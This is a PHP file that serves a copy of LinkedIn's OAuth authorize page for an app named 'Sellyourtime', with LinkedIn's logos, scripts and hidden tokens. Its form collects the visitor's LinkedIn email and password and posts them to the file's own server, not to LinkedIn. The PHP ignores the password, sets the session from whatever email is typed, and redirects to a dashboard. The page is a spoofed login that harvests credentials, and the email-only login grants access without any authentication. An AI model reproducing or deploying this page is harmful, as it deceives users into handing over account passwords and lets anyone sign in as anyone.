<?php
session_start();

if(@$_POST['authorize'])
{
	$_SESSION['syt_email'] = @$_POST['session_key'];
	
	$syt_email = $_SESSION['syt_email'];
	
	if(isset($syt_email))
	{
		header('Location:../dashboard/index.php');
	}
	else
	{
		echo "Not set";
	}
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="pageImpressionID" content="85b912bb-679b-4410-ab73-3e43488870f6"/>
<meta name="pageKey" content="uas-oauth-authorize">
<meta name="analyticsURL" content="/analytics/noauthtracker"/>
<link rel="apple-touch-icon-precomposed" href="https://static.licdn.com/scds/common/u/img/icon/apple-touch-icon.png">
<!--[if lte IE 8]>
  <link rel="shortcut icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/16x16/favicon.ico">
<![endif]-->
<!--[if IE 9]>
  <link rel="shortcut icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
<![endif]-->
<link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
<meta name="msapplication-TileImage" content="https://static.licdn.com/scds/common/u/images/logos/linkedin/logo-in-win8-tile-144_v1.png"/>
<meta name="msapplication-TileColor" content="#0077B5"/>
<meta name="application-name" content="LinkedIn"/>
<link rel="openid.server" href="https://www.linkedin.com/uas/openid/authorize"/>
<title>Authorize | LinkedIn</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
<meta name="pageKey" content="uas-oauth-authorize">
<meta name="IN-signin" content="http://www.linkedin.com/cws/login-popup"/>
<meta name="IN-signin-secure" content="/cws/login-popup"/>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=3bifs78lai5i0ndyj1ew7316e-7rju1q29wa1psxrhfmiak0ydy-7mxyksftlcjzimz2r05hd289r-4uu2pkz5u0jch61r2nhpyyrn8-dxl1g2k3wk6qpss8oq9lwul9c-7poavrvxlvh0irzkbnoyoginp-4om4nn3a2z730xs82d78xj3be-mea0xb6thaagfbcx9i1vg82z-ct4kfyj4tquup0bvqhttvymms-3pwwsn1udmwoy3iort8vfmygt-cfsam81o5sp3cxb7m0hs933c4-648sx8m8b6kj1srq42ztzy224-cd2mdz0dsnx2a8mr21rpzr4vp">
<script type="text/javascript" src="/uas/js/anonymoususerspace"></script>
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=704vg4uf8u24k6x9wklttlter-d0ibg4wftmmsyne01myd4j3c2-24db431rs3jcq8ygpbao2p4er-404k83hk9szcayv25mokbbrs7-ekrfgxjjabckg0gvr2ikhpbwa-bk5qn00zpwqbjfs55zt6sb6i-57op3gixhg18wymy2d9w2nfs0-dvjjucy8ssjng08mp3knhehjq-197b4sklpose0tbxjfedu9dgi-84gfmjh8s4qcq8j67y2qeyp9y-52vwijdk7s1mercwy5gje7xbq-91nl1r2cw4ytf8skxqkshtss4-dr3it9wq45w29j2a84m3bbbjm-1s2zh88q4t28kgbzj0ygmtz0t-o6bt67iysl4cescfidkhgh8w-9yapbb9c5ce3w0tjhqp8s1ben-be35lq69dqsbgl8h9t4bqpy08-avftajdh5oq2u6k2vaor3czdy-2r5gveucqe4lsolc3n0oljsn1-e9rsfv7b5gx0bk0tln31dx3sq-c8ha6zrgpgcni7poa5ctye7il-51dv6schthjydhvcv6rxvospp-3eh5zbf8m3976frnzqqz8r2md-85onz2dtcsuaq6s5hocu6kv2d-ac8pg92mfnb2j836ntpvg1fsi-9wkskbn6s2q25rkbrnuwlqric-8vqvo1r7b0ag99we8a4gleai2-a5j90w6w30bxiqjlfqu3a04ao"></script>
<script type="text/javascript" src="https://static.licdn.com/scds/common/u/js/scds-hashes.js"></script>
<script type="text/javascript">if(typeof LI==='undefined'||!LI){window.LI={};}
LI.JSContentBasePath="https://static.licdn.com/scds/concat/common/js?v=build-2000_8_40929-prod";LI.CSSContentBasePath="https://static.licdn.com/scds/concat/common/css?v=build-2000_8_40929-prod";LI.injectRelayHtmlUrl="https://static.licdn.com/scds/common/u/lib/inject/0.4.2/relay.html";LI.injectRelaySwfUrl="https://static.licdn.com/scds/common/u/lib/inject/0.4.2/relay.swf";LI.comboBaseUrl="https://static.licdn.com/scds/concat/common/css?v=build-2000_8_40929-prod";LI.staticUrlHashEnabled=true;</script>
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=25kaepc6rgo1820ap1rglmzr4-c19zsujfl1pg46iqy33ubhqc5-c5ebkkd7pexovk435l30l1dq5-ascppxxu6dqpt5sppka77kdt0-39o2kw4renyd4i8pt5n9x0qaz-9cttgd1ueltkur8cb164nt1vt-eehwe5piqwg4elnl8jvj9vpx"></script>
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=e17zy6z51dugr6fy4su92o7de"></script>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=a8hkctebat9cvokt4g6pboiwz">
<style>
 html { overflow: visible; }
 </style>
</head>
<body dir="ltr" class="guest v2  chrome-v5 chrome-v5-responsive sticky-bg guest" id="pagekey-uas-oauth-authorize">
<input id="inSlowConfig" type="hidden" value="false"/>
<script type="text/javascript">document.body.className+=" js ";</script>
<div id="shield"></div>
<script type="text/javascript">try{if(window.top!=window.self){document.body.className+=" frame-bust";throw 1;}}
catch(e){window.top.location.replace(document.location);}</script>
<div id="frame-contents">
<div class="container">
<div id="header" class="header"></div>
<div id="body">
<div class="wrapper">
<div id="global-error">
</div>
<div>
<div class="application-relationship">
<div class="photo">
<img src="https://static.licdn.com/scds/common/u/images/themes/katy/ghosts/person/ghost_person_80x80_v1.png" height="72" width="72">
</div>
<div class="myself">
<p>
</p>
</div>
<div class="app">
<img src="https://static.licdn.com/scds/common/u/img/icon/icon_no_developer_img_80x80.png" height="72" width="72">
</div>
</div>
<div class="wrapper">
<p class="note">Sellyourtime would like to access some of your LinkedIn info:</p>
</div>
<ul class="permissions">
<li>
<div class="icon">
<i class="r_basicprofile" title="YOUR PROFILE OVERVIEW"></i>
</div>
<div class="details">
<a href="https://help.linkedin.com/app/answers/detail/a_id/1207/loc/na/trk/uas-oauth-authorize/" target="_blank" rel="nofollow">YOUR PROFILE OVERVIEW</a>
<p class="description">Name, photo, headline, and current positions</p>
</div>
</li>
<li>
<div class="icon">
<i class="r_emailaddress" title="YOUR EMAIL ADDRESS"></i>
</div>
<div class="details">
<a href="https://help.linkedin.com/app/answers/detail/a_id/1207/loc/na/trk/uas-oauth-authorize/" target="_blank" rel="nofollow">YOUR EMAIL ADDRESS</a>
<p class="description">The primary email address you use for your LinkedIn account</p>
</div>
</li>
</ul>
</div>
<form action="#" method="POST" name="oauthAuthorizeForm" novalidate="novalidate" class="grant-access" data-jsenabled="check">
<input type="hidden" name="isJsEnabled" value="false"/>
<div class="login">
<p class="description">Sign in to LinkedIn and allow access:</p>
<ul>
<li class="email-input">
<label for="session_key-oauthAuthorizeForm">Email</label>
<script id="control-http-12157-exec-22151363-1" type="linkedin/control" class="li-control">LI.Controls.addControl('control-http-12157-exec-22151363-1','GhostLabel',{});</script>
<div class="fieldgroup">
<input type="text" name="session_key" value="" id="session_key-oauthAuthorizeForm" autocorrect="off" autocapitalization="off" data-ime-mode-disabled>
<span class="error" id="session_key-oauthAuthorizeForm-error"></span>
</div>
<a target="_blank" href="/reg/join">Join LinkedIn</a>
</li>
<li class="password-input">
<label for="session_password-oauthAuthorizeForm">Password</label>
<script id="control-http-12157-exec-22151363-2" type="linkedin/control" class="li-control">LI.Controls.addControl('control-http-12157-exec-22151363-2','GhostLabel',{});</script>
<div class="fieldgroup">
<input type="password" name="session_password" id="session_password-oauthAuthorizeForm" autocorrect="off" autocapitalization="off" maxlength="400" placeholder="Password">
<span class="error" id="session_password-oauthAuthorizeForm-error"></span>
</div>
<a target="_blank" href="/uas/request-password-reset?trk=uas-resetpass">Forgot your password?</a>
</li>
</ul>
</div>
<ul class="duration">
<li id="duration" class="login">
<label for="duration-oauthAuthorizeForm" class="duration-label">Extra time:</label>
<div class="fieldgroup">
<span class="error" id="duration-oauthAuthorizeForm-error"></span>
<p class="access">
<strong>Until Revoked</strong> <a href="#">change</a>
<script id="control-http-12157-exec-22151363-3" type="linkedin/control" class="li-control">LI.Controls.addControl('control-http-12157-exec-22151363-3','ToggleClass',{classname:'changing',on:'#duration',stopEvent:true});</script>
</p>
<div class="access-options">
<select name="duration" id="duration-oauthAuthorizeForm" class="duration-select">
<option value="0">Until Revoked</option>
<option value="720">Thirty Days</option>
<option value="168">One Week</option>
<option value="24">One Day</option>
</select>
</div>
</div>
</li>
</ul>
<div class="actions">
<ul>
<li>
<input type="submit" name="authorize" value="Allow access" class="allow">
</li>
<li><a href="../index.php" class="cancel">Cancel</a></li>
</ul>
<div class="logo">LinkedIn</div>
</div>
<input type="hidden" name="extra" value="" id="extra-oauthAuthorizeForm"><input type="hidden" name="access" value="-3" id="access-oauthAuthorizeForm"><input type="hidden" name="agree" value="true" id="agree-oauthAuthorizeForm"><input type="hidden" name="oauth_token" value="75--538a138a-8302-4fdd-a0e4-673d44ae2ed4" id="oauth_token-oauthAuthorizeForm"><input type="hidden" name="email" value="" id="email-oauthAuthorizeForm"><input type="hidden" name="appId" value="" id="appId-oauthAuthorizeForm"><input type="hidden" name="csrfToken" value="ajax:8546230493437788077" id="csrfToken-oauthAuthorizeForm"><input type="hidden" name="sourceAlias" value="0_8L1usXMS_e_-SfuxXa1idxJ207ESR8hAXKfus4aDeAk" id="sourceAlias-oauthAuthorizeForm">
</form>
</div>
</div>
<script type="text/javascript">LI.Controls.processQueue();</script>
<div id="footer" class="footer">
<div class="legal">
<p>
<span class="settings">All <strong><a target="_blank" href="/secure/settings?userAgree=">Applications</a></strong> can be found in your settings</span>
<span class="agreements"><strong><a target="_blank" href="http://www.linkedin.com/static?key=user_agreement&trk=hb_ft_userag">Terms of Service</a></strong> | <strong><a target="_blank" href="http://www.linkedin.com/static?key=privacy_policy&trk=hb_ft_priv">Privacy Policy</a></strong></span>
</p>
</div>
</div>
</div>
</div>
<div id="frame"></div>
<script type="text/javascript">try{IN.Support.sendReadyResponse(true);}catch(err){}</script>
<script id="localChrome"></script>
<script>var jsRandomCalculator=(function(){function compute(n,email,ts){try{var vs=n.split(":"),ts=parseInt(ts),len=vs.length,i,v,f1_out,f2_out;for(i=0;i<len;i++){vs[i]=parseInt(vs[i],10);}f1_out=f1(vs,ts);f2_out=f2(f1_out,ts);if(f1_out[0]%1000>f1_out[1]%1000){v=f1_out[0];}else{v=f1_out[1];}return f3(v,f2_out,email);}catch(err){return-1;}}function computeJson(input){return compute(input.n,input.email,input.ts);}function f1(vs,ts){var output=[],i;output[0]=vs[0]+vs[1]+vs[2];output[1]=(vs[0]%100+30)*(vs[1]%100+30)*(vs[2]%100+30);for(i=0;i<10;i++){output[0]+=(output[1]%1000+500)*(ts%1000+500);output[1]+=(output[0]%1000+500)*(ts%1000+500);}return output;}function f2(vs,ts){var sum=vs[0]+vs[1],n=sum%3000,m=sum%10000,p=ts%10000;if(n<1000){return Math.pow(m+12345,2)+Math.pow(p+34567,2);}else if(n<2000){return Math.pow(m+23456,2)+Math.pow(p+23456,2);}else{return Math.pow(m+34567,2)+Math.pow(p+12345,2);}}function f3(v1,v2,email){var len=email.length,v3=0,i=0;for(;i<len;i++){v3+=email.charCodeAt(i)<<((5*i)%32);}return(v1*v2*v3)%1000000007;}return{compute:compute,computeJson:computeJson,version:"1.0.1"};}());</script>
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=eq875keqggun9hoxzfhbanjes"></script>
<script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=czstax4e6y68hymdvqxpwe5so-e2w0ytit45cew0zvrmwmlx7j4"></script>
<script type="text/javascript">LI_WCT(["control-http-12157-exec-22151363-1","control-http-12157-exec-22151363-2","control-http-12157-exec-22151363-3",]);</script>
<script type="text/javascript">LI.Controls.processQueue();</script>
</body>
</html>